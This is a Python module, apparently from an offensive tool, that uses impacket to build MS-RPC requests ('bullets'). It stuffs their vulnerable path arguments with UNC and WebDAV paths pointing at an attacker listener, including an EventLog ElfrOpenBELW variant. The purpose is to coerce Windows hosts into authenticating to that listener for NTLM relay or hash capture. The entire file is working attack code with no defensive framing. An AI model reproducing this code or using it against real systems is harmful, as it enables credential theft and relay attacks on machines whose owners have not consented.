import random
import string
from copy import deepcopy

from impacket.dcerpc.v5.even import ElfrOpenBELW


def generate_paths(listener, k=5):
    rand_strs = [''.join(random.choices(string.ascii_letters, k=k)) for _ in range(4)]
    return {
        'http': [
            (r'\\%s@80/%s\file.txt' + '\x00') % (listener, rand_strs[0])
        ],
        'smb': [
            (r'\\%s\%s\file.txt' + '\x00') % (listener, rand_strs[1]),
            # (r'\\%s\%s\\x00' + '\x00') % (listener, rand_strs[2]),
            # (r'\\%s\%s\x00' + '\x00') % (listener, rand_strs[3]),
        ]
    }


class BulletGenerator:
    def __init__(self, _class, init_args: dict, vul_args: list):
        self._class = _class
        self._init_args = init_args
        self._vul_args = vul_args

    def generate(self, listener, types=None):
        # 组装炮弹
        _bullets = []
        if types is None:
            types = ['smb']
        bullet = self._class()
        for k, v in self._init_args.items():
            bullet[k] = v

        for tp in types:
            if self._class is ElfrOpenBELW:
                paths = [f'\\??\\UNC\\{listener}\\XTeam\\hh']
            else:
                paths = generate_paths(listener).get(tp)
            for path in paths:
                tmp_bullet = deepcopy(bullet)
                for vul_arg in self._vul_args:
                    tmp_bullet[vul_arg] = path
                _bullets.append(tmp_bullet)
        return _bullets
